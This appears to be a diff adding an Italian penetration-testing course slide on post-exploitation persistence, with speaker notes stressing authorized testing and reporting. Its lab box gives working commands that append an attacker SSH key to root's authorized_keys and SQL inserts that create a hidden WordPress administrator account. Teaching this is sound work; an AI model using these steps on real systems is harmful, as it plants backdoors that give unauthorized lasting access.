@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Capitolo 5: Post-Exploitation - Persistence</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Capitolo 5: Post-Exploitation</h1>
+        <div class="subtitle">Slide 5.4: Tecniche di Persistence</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Teoria: Mantenere l'Accesso</div>
+                <div class="card-text">
+                    <p>La <strong>persistence</strong> permette di rientrare nel sistema anche se la vulnerabilità originale viene patchata.</p>
+                    <br>
+                    <p><strong>Tecniche comuni (WordPress):</strong></p>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li><span class="text-red">Webshell nascosta</span> in plugin/theme</li>
+                        <li><span class="text-red">Plugin backdoor</span> (fake security plugin)</li>
+                        <li><span class="text-red">Admin account nascosto</span></li>
+                        <li><span class="text-yellow">Modifica functions.php</span></li>
+                        <li><span class="text-yellow">Cron job malevolo</span></li>
+                    </ul>
+                    <br>
+                    <p><strong>Tecniche comuni (Linux):</strong></p>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li>SSH key in authorized_keys</li>
+                        <li>Nuovo utente in /etc/passwd</li>
+                        <li>Crontab entry</li>
+                        <li>Systemd service</li>
+                    </ul>
+                    <br>
+                    <p class="security-insight"><strong>Security Insight:</strong> In un pentest AUTORIZZATO, documentate la persistence senza implementarla realmente, oppure rimuovetela immediatamente dopo il test.</p>
+                </div>
+            </div>
+
+            <div class="card border-yellow">
+                <div class="card-title">Lab: Esempio di Persistence (Demo)</div>
+                <div class="card-text">
+                    <p><strong>⚠️ SOLO A SCOPO DIMOSTRATIVO ⚠️</strong></p>
+                    <br>
+                    <p><strong>1. SSH Key Persistence:</strong></p>
+                    <div class="code-box"><span class="text-red">#</span> mkdir -p /root/.ssh
+<span class="text-red">#</span> echo "ssh-rsa AAAA...chiave_attacker..." >> /root/.ssh/authorized_keys
+<span class="text-red">#</span> chmod 600 /root/.ssh/authorized_keys</div>
+                    <br>
+                    <p><strong>2. WordPress Hidden Admin:</strong></p>
+                    <div class="code-box">mysql> INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status) 
+VALUES ('support_backup', '$P$BHashedPass...', 'support@legit.com', NOW(), 0);
+
+mysql> INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
+VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');</div>
+                    <br>
+                    <p><strong>Nel report:</strong> "L'attaccante potrebbe stabilire persistence tramite [metodo]. Verificare presenza di account anomali e file modificati di recente."</p>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+    <!-- 
+        SPEAKER NOTES:
+        "Questa slide è delicata. La persistence è ciò che un attaccante reale farebbe, ma noi siamo pentester etici.
+        A sinistra, le tecniche comuni. A livello WordPress e a livello sistema.
+        A destra, ESEMPI TEORICI. In un lab potete testarli, in produzione MAI senza accordi specifici.
+        L'SSH key persistence è la più pulita: aggiungiamo la nostra chiave pubblica, entriamo quando vogliamo.
+        L'admin nascosto in WordPress è subdolo: un account con nome 'innocente' tipo 'support_backup'.
+        Nel report reale: 'Verificata possibilità di persistence. NON implementata per policy concordata.'
+        Se il cliente vuole un test di persistence, va scritto esplicitamente nello scope."
+    -->
+
+    <script>const slideNumero = 35;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
